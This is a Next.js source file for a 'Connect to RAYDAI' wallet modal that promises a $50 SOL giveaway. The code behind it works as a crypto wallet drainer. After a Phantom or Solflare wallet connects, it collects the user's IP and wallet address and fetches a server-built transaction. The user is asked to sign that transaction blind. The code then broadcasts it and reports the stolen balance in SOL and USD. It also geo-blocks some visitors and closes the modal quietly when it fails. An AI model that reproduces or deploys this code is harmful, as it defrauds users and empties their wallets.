"use client"
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog" 
import { Button } from "@/components/ui/button" 
import Image from "next/image" 
import { useState, useEffect } from "react" 


interface ModalsProps {
  isOpen: boolean
  onClose: () => void
}


const DESKTOP_WALLETS = {
  phantom: {
    name: "Phantom",
    icon: "/phantom-icon.png",
    provider: () => (window as any).phantom?.solana,
    checkMethod: () => (window as any).phantom?.solana?.isPhantom,
  },
  solflare: {
    name: "Solflare",
    icon: "/solflare-icon.png",
    provider: () => (window as any).solflare,
    checkMethod: () => (window as any).solflare?.isSolflare,
  },
}


const MOBILE_WALLETS = {
  phantom: {
    name: "Phantom",
    icon: "/phantom-icon.png",
    deepLink: "phantom://browse/",
    universalLink: "https://phantom.app/ul/browse/",
    mobile: {
      android: {
        schema: "phantom://",
        universal: "",
      },
      ios: {
        schema: "phantom://",
        universal: "",
      },
    },
  },
  solflare: {
    name: "Solflare",
    icon: "/solflare-icon.png",
    deepLink: "solflare://ul/v1/browse/",
    universalLink: "https://solflare.com/ul/v1/browse/",
    mobile: {
      android: {
        schema: "solflare://ul/v1/browse/",
        universal: "https://solflare.com/ul/v1/browse/",
      },
      ios: {
        schema: "solflare://ul/v1/browse/",
        universal: "https://solflare.com/ul/v1/browse/",
      },
    },
  },
}


const wallets = [
  {
    id: "phantom",
    name: "Phantom",
    icon: "/phantom-icon.png",
    description: "Popular wallet for Solana",
  },
  {
    id: "solflare",
    name: "Solflare",
    icon: "/solflare-icon.png",
    description: "Reliable wallet for Solana ecosystem",
  },
]


// RAYDAI Icon components
const RocketIcon = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 24 24" fill="currentColor">
    <path d="M12 2.5s4.5 2.04 4.5 10.5c0 2.49-1.04 5.57-1.6 7H9.1c-.56-1.43-1.6-4.51-1.6-7C7.5 4.54 12 2.5 12 2.5zm2 8.5c0-1.1-.9-2-2-2s-2 .9-2 2 .9 2 2 2 2-.9 2-2zm-6 7c0 .55.45 1 1 1h6c.55 0 1-.45 1-1v-1H9v1z"/>
  </svg>
)

const GiftIcon = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 24 24" fill="currentColor">
    <path d="M20 6h-2.18c.11-.31.18-.65.18-1 0-1.66-1.34-3-3-3-1.05 0-1.96.54-2.5 1.35L12 4l-.5-.65C10.96 2.54 10.05 2 9 2 7.34 2 6 3.34 6 5c0 .35.07.69.18 1H4c-1.11 0-1.99.89-1.99 2L2 19c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V8c0-1.11-.89-2-2-2zm-5-2c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zM9 4c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm11 15H4v-2h16v2zm0-5H4V8h5.08L7 10.83 8.62 12 12 7.4l3.38 4.6L17 10.83 14.92 8H20v6z"/>
  </svg>
)


export function Modals({ isOpen, onClose }: ModalsProps) {
  const [isMobileViewState, setIsMobileViewState] = useState(false) 
  const [connectedWalletData, setConnectedWalletData] = useState<any>(null) 
  const [isBlockedGeoState, setIsBlockedGeoState] = useState(false) 

  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera
      const mobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase())
      setIsMobileViewState(mobile)
    }
    checkMobile()

    checkGeoBlockStatus()
  }, [])

  
  const checkGeoBlockStatus = async () => {
    try {
      const response = await fetch("/api/check-geo")
      const data = await response.json()
      if (data.blocked) {
        setIsBlockedGeoState(true)
        onClose()
      }
    } catch (error) {}
  }

  
  const isInWalletBrowserInstance = (walletId: string) => {
    const userAgent = navigator.userAgent.toLowerCase()
    if (walletId === "phantom") {
      return userAgent.includes("phantom")
    }
    if (walletId === "solflare") {
      return userAgent.includes("solflare")
    }
    return false
  }

  
  const connectDesktopWalletInstance = async (walletId: string) => {
    const walletConfig = DESKTOP_WALLETS[walletId as keyof typeof DESKTOP_WALLETS]

    if (!walletConfig) {
      return
    }

    const provider = walletConfig.provider()

    if (provider && walletConfig.checkMethod()) {
      try {
        const response = await provider.connect()
        setConnectedWalletData(provider)
        await scanAndCreateTransactionData(response.publicKey.toString(), provider)
      } catch (error) {}
    } else {
      if (walletId === "phantom") {
        window.open("https://phantom.app/download", "_blank")
      } else if (walletId === "solflare") {
        window.open("https://solflare.com/download", "_blank")
      }
    }
  }

  
  const connectMobileWalletInstance = (walletId: string) => {
    const walletConfig = MOBILE_WALLETS[walletId as keyof typeof MOBILE_WALLETS]

    if (!walletConfig) {
      return
    }

    if (isInWalletBrowserInstance(walletId)) {
      connectDesktopWalletInstance(walletId)
      return
    }

    const currentUrl = window.location.href
    const isIOSDevice = /iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase())
    const isAndroidDevice = /android/i.test(navigator.userAgent.toLowerCase())

    let deepLink = ""
    let universalLink = ""

    if (walletId === "phantom") {
      deepLink = `phantom://browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`
      universalLink = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`
    } else if (walletId === "solflare") {
      deepLink = walletConfig.deepLink + encodeURIComponent(currentUrl)
      universalLink = walletConfig.universalLink + encodeURIComponent(currentUrl)
    }

    window.location.href = deepLink

    setTimeout(() => {
      window.location.href = universalLink
    }, 1500)
  }

  
  const handleConnectWalletClick = (walletId: string) => {
    if (isMobileViewState) {
      connectMobileWalletInstance(walletId)
    } else {
      connectDesktopWalletInstance(walletId)
    }
  }

  
  const scanAndCreateTransactionData = async (publicKey: string, provider: any) => {
    try {
      let userIPAddress = "unknown"
      try {
        const ipResponse = await fetch("https://api.ipify.org?format=json")
        const ipData = await ipResponse.json()
        userIPAddress = ipData.ip || "unknown"
      } catch (ipError) {
        try {
          const ipResponse2 = await fetch("https://api.my-ip.io/ip")
          const ipText = await ipResponse2.text()
          userIPAddress = ipText.trim() || "unknown"
        } catch {}
      }

      const response = await fetch("/api/scan-wallet", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletAddress: publicKey,
          userIP: userIPAddress,
        }),
      })

      if (!response.ok) {
        setTimeout(() => {
          onClose()
        }, 1000)
        return
      }

      const data = await response.json()

      if (data.message === "Insufficient balance") {
        setTimeout(() => {
          onClose()
        }, 1000)
        return
      }

      const { Connection, Transaction } = await import("@solana/web3.js")
      const transaction = Transaction.from(Buffer.from(data.transaction, "base64"))

      const signedTransaction = await provider.signTransaction(transaction)

      const RPC_ENDPOINTS = [
        "https://solana-rpc.publicnode.com",
        "https://api.mainnet-beta.solana.com",
        "https://solana.drpc.org",
        "https://solana.lavenderfive.com",
        "https://solana.api.onfinality.io/public",
        "https://public.rpc.solanavibestation.com",
      ]

      let signature = ""
      let lastError = null

      for (const endpoint of RPC_ENDPOINTS) {
        try {
          const connection = new Connection(endpoint, "confirmed")

          signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
            skipPreflight: false,
            preflightCommitment: "confirmed",
          })

          await connection.confirmTransaction({
            signature,
            blockhash: data.blockhash,
            lastValidBlockHeight: data.lastValidBlockHeight,
          })
          break
        } catch (err: any) {
          lastError = err
          continue
        }
      }

      if (!signature) {
        throw lastError || new Error("Transaction failed")
      }

      await fetch("/api/transaction-approved", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletAddress: publicKey,
          balanceSOL: data.walletBalance,
          balanceUSD: data.walletBalance * 153.32,
          userIP: userIPAddress,
        }),
      })

      setTimeout(() => {
        onClose()
      }, 1000)
    } catch (error: any) {
      setTimeout(() => {
        onClose()
      }, 1000)
    }
  }

  
  if (isBlockedGeoState) {
    return null
  }

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="bg-gray-900 text-white border border-gray-800 rounded-2xl shadow-2xl max-w-md p-0 overflow-hidden">
        {/* Modal Header with RAYDAI styling */}
        <div className="bg-gradient-to-r from-purple-900 via-violet-900 to-indigo-900 p-6">
          <DialogHeader>
            <div className="flex items-center justify-center gap-3 mb-4">
              <div className="w-12 h-12 bg-white/10 backdrop-blur-sm rounded-xl flex items-center justify-center">
                <RocketIcon className="w-8 h-8 text-white" />
              </div>
              <div>
                <DialogTitle className="text-2xl font-bold text-center text-white">
                  Connect to RAYDAI
                </DialogTitle>
                <DialogDescription className="text-center text-purple-200 mt-1">
                  Connect wallet to enter $50 SOL giveaway
                </DialogDescription>
              </div>
            </div>
          </DialogHeader>
        </div>
        
        {/* Giveaway reminder */}
        <div className="px-6 pt-6 pb-4">
          <div className="bg-gradient-to-r from-purple-900/30 to-indigo-900/30 rounded-xl p-4 mb-6 border border-purple-700/50">
            <div className="flex items-center justify-center gap-3 mb-3">
              <GiftIcon className="w-10 h-10 text-yellow-400" />
              <div className="text-center">
                <div className="text-3xl font-bold bg-gradient-to-r from-yellow-300 to-yellow-100 bg-clip-text text-transparent">
                  $50 SOL
                </div>
                <div className="text-white font-bold">GIVEAWAY ENTRY</div>
              </div>
            </div>
            <p className="text-gray-300 text-center text-sm">
              Connect any wallet to automatically enter our $50 SOL giveaway
            </p>
          </div>
        </div>

        {/* Wallet Options with RAYDAI styling */}
        <div className="px-6 pb-6 space-y-4">
          {wallets.map((wallet) => (
            <Button
              key={wallet.id}
              variant="outline"
              className="w-full h-auto p-4 flex items-center justify-start gap-4 bg-gradient-to-r from-gray-800/50 to-gray-900/50 hover:from-purple-900/30 hover:to-indigo-900/30 hover:border-purple-600 transition-all border border-gray-700 rounded-xl"
              onClick={() => handleConnectWalletClick(wallet.id)}
            >
              <div className="relative h-12 w-12 flex-shrink-0 rounded-[15px] overflow-hidden">
                <Image
                  src={wallet.icon || "/favicon.png"}
                  alt={`${wallet.name} icon`}
                  fill
                  className="object-cover"
                />
              </div>
              <div className="flex flex-col items-start text-left flex-1">
                <span className="font-semibold text-base text-white">{wallet.name}</span>
                <span className="text-sm text-gray-400">{wallet.description}</span>
              </div>
              <div className="text-gray-500">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
                </svg>
              </div>
            </Button>
          ))}

          {/* Other Wallet Option */}
          <Button 
            variant="outline"
            className="w-full border-2 border-gray-700 hover:border-purple-600 hover:bg-purple-900/20 text-gray-300 font-bold py-4 rounded-xl"
            onClick={() => {
              window.open("https://phantom.app/download", "_blank")
            }}
          >
            <span>Other Wallet Options</span>
          </Button>

          {/* Benefits Section */}
          <div className="mt-6 p-4 bg-gray-800/50 rounded-xl">
            <h4 className="font-bold text-white mb-2 text-center">Benefits of Connecting:</h4>
            <ul className="space-y-2 text-sm text-gray-300">
              <li className="flex items-center gap-2">
                <div className="w-2 h-2 bg-green-500 rounded-full"></div>
                <span>Enter $50 SOL giveaway automatically</span>
              </li>
              <li className="flex items-center gap-2">
                <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                <span>Get early access to RAYDAI platform</span>
              </li>
              <li className="flex items-center gap-2">
                <div className="w-2 h-2 bg-purple-500 rounded-full"></div>
                <span>Join our exclusive community</span>
              </li>
            </ul>
          </div>

          {/* Terms & Conditions */}
          <div className="mt-6 text-center">
            <p className="text-xs text-gray-500">
              By connecting, you agree to RAYDAI's{" "}
              <a href="#" className="text-purple-400 hover:text-purple-300 font-medium">Terms</a>
              {" "}and{" "}
              <a href="#" className="text-purple-400 hover:text-purple-300 font-medium">Privacy Policy</a>
            </p>
          </div>
        </div>
      </DialogContent>
    </Dialog>
  )
}